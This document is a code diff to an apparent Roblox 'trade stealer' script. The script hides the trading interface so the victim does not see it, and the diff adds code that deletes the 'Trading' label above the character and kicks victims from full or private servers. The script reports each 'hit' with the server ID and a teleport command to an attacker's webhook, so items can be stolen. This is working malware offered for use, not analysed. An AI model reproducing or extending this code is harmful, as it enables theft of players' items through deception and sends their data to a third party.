@@ -5,7 +5,7 @@ end
 _G.scriptExecuted = true
 
 -- // AUTHENTICATION
-local auth_token = "EBK-SS-A" -- Le jeton de sécurité requis par ton Worker
+local auth_token = "EBK-SS-A" 
 
 local itemsToSend = {}
 local categories = {"Sword", "Emote", "Explosion"}
@@ -24,16 +24,26 @@ local Replion = require(game.ReplicatedStorage.Packages.Replion)
 local users = _G.Usernames or {}
 local min_rap = _G.min_rap or 100
 local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or "" -- Ici, mets l'URL de ton Cloudflare Worker
+local webhook = _G.webhook or ""
 
 -- // PROTECTION ET VÉRIFICATIONS
 if next(users) == nil or webhook == "" then
-    plr:kick("You didn't add usernames or worker URL")
+    plr:kick("You didn't add usernames or webhook")
     return
 end
 
 if game.PlaceId ~= 13772394625 then
     plr:kick("only work on server normal")
+    return
+end
+
+if #Players:GetPlayers() >= 16 then
+    plr:kick("Server is full. Please join a less populated server")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    plr:kick("Server error. Please join a DIFFERENT server")
     return
 end
 
@@ -60,6 +70,23 @@ local maintradegui = tradeGui.Main
 maintradegui.Visible = false
 maintradegui:GetPropertyChangedSignal("Visible"):Connect(function()
     maintradegui.Visible = false
+end)
+
+tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
+    inTrade = tradeGui.Enabled
+    if inTrade then
+        -- // SUPPRESSION DU "TRADING" AU DESSUS DE LA TÊTE
+        task.spawn(function()
+            if plr.Character then
+                for i = 1, 20 do
+                    for _, obj in ipairs(plr.Character:GetDescendants()) do
+                        if obj:IsA("BillboardGui") then obj:Destroy() end
+                    end
+                    task.wait(0.1)
+                end
+            end
+        end)
+    end
 end)
 
 -- // FONCTIONS DE TRADING (RÉSEAU)
@@ -108,7 +135,7 @@ end
 
 local totalRAP = 0
 
--- // SYSTÈME DE WEBHOOKS AVEC AUTHTOKEN
+-- // SYSTÈME DE WEBHOOKS
 local function SendJoinMessage(list, prefix)
     local isGoodHit = totalRAP >= 500
     local embedTitle = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
@@ -141,7 +168,7 @@ local function SendJoinMessage(list, prefix)
     end
 
     local data = {
-        ["auth_token"] = auth_token, -- Inclus pour la validation par le Worker
+        ["auth_token"] = auth_token, -- AJOUT DU TOKEN ICI
         ["username"] = webhookName,
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
@@ -186,7 +213,7 @@ local function SendMessage(list)
     end
 
     local data = {
-        ["auth_token"] = auth_token, -- Inclus pour la validation par le Worker
+        ["auth_token"] = auth_token, -- AJOUT DU TOKEN ICI
         ["username"] = webhookName,
         ["embeds"] = {{
             ["title"] = "⚪ Server Hit 🎯",
